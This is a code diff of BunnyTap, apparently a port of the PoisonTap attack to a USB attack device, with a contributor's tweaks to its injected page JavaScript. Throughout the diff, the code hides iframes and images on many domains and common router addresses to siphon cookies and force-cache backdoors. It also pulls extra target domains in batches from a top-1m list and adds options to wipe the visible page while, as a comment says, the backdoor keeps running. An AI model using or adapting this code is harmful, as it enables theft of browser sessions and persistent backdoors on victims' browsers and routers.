@@ -5,7 +5,7 @@
 <html><head></head>
 <body>
 <div id="__title">
-Welcome to <b><a style="color: #E30B5D" href="https://forums.hak5.org/index.php?/topic/40240-poisontap-on-the-bunny/">BunnyTap</a></b>, by <a style="color: #E30B5D">Whistle Master</a>.<br>Based on <b><a style="color: #E30B5D" href="https://samy.pl/poisontap">PoisonTap</a></b> created by <a style="color: #E30B5D" href="https://samy.pl">samy kamkar</a>.<p>
+Welcome to <b><a style="color: #E30B5D" href="https://forums.hak5.org/index.php?/topic/40240-poisontap-on-the-bunny/">BunnyTap</a></b>, by <a style="color: #E30B5D">Whistle Master</a>, tweaked by <a style="color: #E30B5D">Gachnang</a>.<br>Based on <b><a style="color: #E30B5D" href="https://samy.pl/poisontap">PoisonTap</a></b> created by <a style="color: #E30B5D" href="https://samy.pl">samy kamkar</a>.<p>
 </div>
 <script>
 // This entire file can behave as both JS and HTML (note the open-comment at the top to prevent HTML from executing in a JS environment)
@@ -22,7 +22,7 @@ Welcome to <b><a style="color: #E30B5D" href="https://forums.hak5.org/index.php?
 var displayAnimation = 1;
 
 // PoisonTap's IP address (set up in network config)
-var ptIp = '1.0.0.1';
+var ptIp = '174.16.64.1';
 
 // Whether we want to use image tags or iframes to
 // exfiltrate cookies and force cache backdoors.
@@ -39,7 +39,7 @@ var dnsPinServer = '.ip.samy.pl';
 /* First poison the user's cache of common JS files from CDNs */
 var pre = '';
 // Gachnang 'count' start 
-var countMax = getDoms().length + 1;
+var countMax = 0; //getDoms().length + 1;
 // Gachnang 'count' end
 
 backdoorRouters();
@@ -51,13 +51,20 @@ function addIframe(host)
 {
 	var url = 'http://' + host + '/PoisonTap';
 	var iframe = document.createElement('iframe');
-	pre += 'Siphoning cookies & force caching backdoor on ' + url + '<br>';
+	//pre += 'Siphoning cookies & force caching backdoor on ' + url + '<br>';
 	
 	// Gachnang 'count' start
-	iframe.addEventListener('load', TargedLoad);
-	iframe.addEventListener('error', TargedError);
+	if(iframe.addEventListener){
+		iframe.addEventListener('load', TargedDone);
+		iframe.addEventListener('error', TargedDone);
+	} else {
+		iframe.attachEvent("onload", TargedDone);
+		iframe.attachEvent("onerror", TargedDone);
+	}
+	countMax++;
 	// Gachnang 'count' end
 	
+	iframe.id = host;
 	iframe.src = url;
   //document.body.appendChild(iframe);
 
@@ -75,6 +82,7 @@ function addImg(host)
 	// Gachnang 'count' start
 	img1.addEventListener('load', TargedDone);
 	img1.addEventListener('error', TargedDone);
+	countMax++;
 	// Gachnang 'count' end
 	img1.src = url;
 
@@ -82,6 +90,23 @@ function addImg(host)
   //var img2 = document.createElement('img');
 	//img2.src = 'http://www.' + host + '/PoisonTap';
 }
+
+// Gachnang 'util' start
+var HttpClient = function() {
+    this.get = function(aUrl, aCallback) {
+        var anHttpRequest = new XMLHttpRequest();
+        anHttpRequest.onreadystatechange = function() { 
+            if (anHttpRequest.readyState == 4 ){ // && anHttpRequest.status == 200)
+                aCallback(anHttpRequest);				
+			}
+        }
+
+        anHttpRequest.open( "GET", aUrl, true );            
+        anHttpRequest.send( null );
+    }
+}
+// Gachnang 'util' end
+
 // Gachnang 'count' start
 var countDone = 0; 
 function TargedDone() {
@@ -90,38 +115,172 @@ function TargedDone() {
 		
 	finishedQuestion();
 }
+// Gachnang 'count' end
 
-var blankOnFinish = true;
+// Gachnang 'finished' start
+var onFinished = 0;
+var finishOnBunnyAway = 0;
+
+var bunnyAway = false;
+var bunnyAwayCounter = 0;
+setTimeout(getBunnyAway, 3000);
+
 function finishedQuestion(){
-	if(blankOnFinish &&	countDone >= countMax){
-		// 'you have seen nothing..'
-		// location = 'about:blank'; // <- can shutdown 'backdoor'..
-		setTimeout(function(){ 
-			document.getElementById('canvas').outerHTML = "";
-			document.getElementById('__ptterm').outerHTML = "";
-			document.getElementById('__title').outerHTML = "";
-			document.getElementById('__poisontap').outerHTML = "";
-		}, 30000);		
+	let close = bunnyAway;
+	
+	if(countDone >= countMax){
+		if(useTop1m == 1){
+			top1mRequest();
+		} else {
+			close=true;
+		}
 	}
 	
 	var s = document.getElementById('__ptterm_status_d');
 	s.innerHTML = countDone;
 	var m = document.getElementById('__ptterm_status_m');
 	m.innerHTML = countMax;	
+	
+	if(close){ // countDone >= countMax
+		// 'you have seen nothing..'
+		if(onFinished == 1 ){
+			// clear page, only leaves "/* */" <- 'backdoor' will still run
+			setTimeout(function(){ 
+				document.getElementById('canvas').outerHTML = "";
+				document.getElementById('__ptterm').outerHTML = "";
+				document.getElementById('__title').outerHTML = "";
+				document.getElementById('__poisontap').outerHTML = "";
+			}, 1000);		
+		} else
+		if(onFinished == 2 ){
+			// redirect to 'about:blank' <- can shutdown 'backdoor'..
+			setTimeout(function(){ 
+				location = 'about:blank';
+			}, 1000);
+		}
+	}
+	
 }
-// Gachnang 'count' end
+var bunnyConfigReceived=false;
+function getBunnyAway(){
+    var client = new HttpClient();
+	client.get('/BunnyTap', function(response) {
+		if(response && response.status == 200){
+			if (displayAnimation)
+				console.log('BashBunny still alive!');
+			
+			bunnyAway = false;
+			bunnyAwayCounter = 0;
+			
+			// can throw error..
+			let answer = JSON.parse(response.responseText);
+			if(answer && !bunnyConfigReceived){
+				if(answer.hasOwnProperty('onFinished')){
+					onFinished = answer.onFinished;
+				}
+				
+				if(answer.hasOwnProperty('finishOnBunnyAway')){
+					finishOnBunnyAway = answer.finishOnBunnyAway;
+				}
+				
+				if(answer.hasOwnProperty('useTop1m')){
+					useTop1m = answer.useTop1m;
+				}
+				
+				bunnyConfigReceived = true;
+			}
+		} else {
+			bunnyAwayCounter++;
+			
+			if (displayAnimation)
+				console.log('BashBunnys answer missed! ' + bunnyAwayCounter);	
+			
+			if(bunnyAwayCounter >= 3){
+				if (displayAnimation)
+					console.log('BashBunny\'s missing! ' + bunnyAwayCounter);
+					
+				bunnyAway = true;
+				finishedQuestion();
+			}
+		}		
+	});
+	
+	setTimeout(getBunnyAway, 3000);
+}
+
+// Gachnang 'top-1m.csv' end
+var useTop1m = 0;
+var top1mStep = 100;
+var top1mStart = 0;
+var top1mStop = 100;
+function top1mRequest(){
+	if(useTop1m == 1){
+		var client = new HttpClient();
+		client.get('/top-1m/' + top1mStart + '/' + top1mStop, top1mAnswer);
+		
+		if (displayAnimation) 
+			console.log('Request started for top1m', top1mStart, top1mStop);	
+		
+		top1mStart = top1mStop + 1;
+		top1mStop  = top1mStart + top1mStep;
+	}
+}
+
+function top1mAnswer(response){
+	if(response && response.status == 200){
+		// can throw error..
+		let answer = JSON.parse(response.responseText);
+		if(answer){		
+			if(answer.hasOwnProperty('status') && answer.status > 0){
+				if (displayAnimation)
+					console.log('Answer for top1m: status is ' + answer.status, answer);
+					
+				if(answer.hasOwnProperty('data')){
+					for(let i = 0; i < answer.data.length; i++){
+						// get rid of rownumber
+						if(answer.data[i].indexOf(',') != -1){
+							answer.data[i] = answer.data[i].split(',')[1];
+						}						
+					
+						// not add url already done
+						if(!getDoms().includes(answer.data[i])){
+							// decide whether we cache an img tag or iframe
+							if (cacheIframe)
+							  addIframe(answer.data[i]);
+							else
+							  addImg(answer.data[i]);
+						}
+					}
+				} else {
+					if (displayAnimation)
+						console.log('Answer for top1m: data is missing..', answer);
+						
+					useTop1m=0;
+				}
+			} else {
+				if (displayAnimation)
+					console.log('Answer for top1m: Status is 0 > finished', answer);
+					
+				useTop1m=0;
+			}
+		}
+	}
+}
+// Gachnang 'top-1m.csv'
 
 // Contact common router IP addresses to cache backdoor onto the router
 function backdoorRouters()
 {
   // pin the poisontap IP
   addImg(ptIp + '.pin' + dnsPinServer); // this is meant to pin 192.168.0.1 to 1.0.0.1
-
+  
   // give the pinned resolver a moment to update
   setTimeout(function() {
     var routers = getRouters();
     for (var i in routers){
       addIframe(routers[i] + dnsPinServer);
+	  // no count for routers
+	  countMax--;
 	}
   }, 500);
 }
@@ -171,7 +330,12 @@ if (displayAnimation)
     div.style.right = '10px';
     d.body.appendChild(div);
   }
+} 
+// Gachnang 'hiddeText' start
+else {
+	document.getElementById('__title').outerHTML = "";	
 }
+// Gachnang 'hiddeText' stop
 
 function ltext()
 {
@@ -193,8 +357,8 @@ function ltext()
 	}
 	setTimeout(ltext, 10); // 10 looks better?
 	return;
-
-  // do letter at a time this way
+	/*
+	// do letter at a time this way
 	if (pre.length)
 	{
 		var l = pre.substr(0, 1);
@@ -216,7 +380,7 @@ function ltext()
 	  // before, instead of 'scroller', here was:document.getElementById('__ptterm').innerHTML += l;
 	  
 		setTimeout(ltext, 1); // 10 looks better?
-	}
+	}*/
 }
 
 function ptcanvas()
@@ -226,7 +390,7 @@ function ptcanvas()
 	term.style.color = '#00bfff';
 	term.id = '__ptterm';
 	//term.innerHTML = 'Welcome to <b><a href="http://samy.pl/poisontap">PoisonTap</a></b>, by <a href="http://samy.pl">samy kamkar</a>.<p>' //; &#42;&#47;';
-	term.innerHTML = 'Welcome to <b><a href="https://forums.hak5.org/index.php?/topic/40240-poisontap-on-the-bunny/">BunnyTap</a></b>, by <a>Whistle Master</a>.<br>Based on <b><a href="https://samy.pl/poisontap">PoisonTap</a></b> created by <a href="https://samy.pl">samy kamkar</a>.<p>' //; &#42;&#47;';
+	term.innerHTML = 'Welcome to <b><a href="https://forums.hak5.org/index.php?/topic/40240-poisontap-on-the-bunny/">BunnyTap</a></b>, by <a>Whistle Master</a>, tweaked by <a style="color: #E30B5D">Gachnang</a>.<br>Based on <b><a href="https://samy.pl/poisontap">PoisonTap</a></b> created by <a href="https://samy.pl">samy kamkar</a>.<p>' //; &#42;&#47;';
   term.style.width = '100%';
   term.style.height = '100%';
   term.style.position = 'fixed';
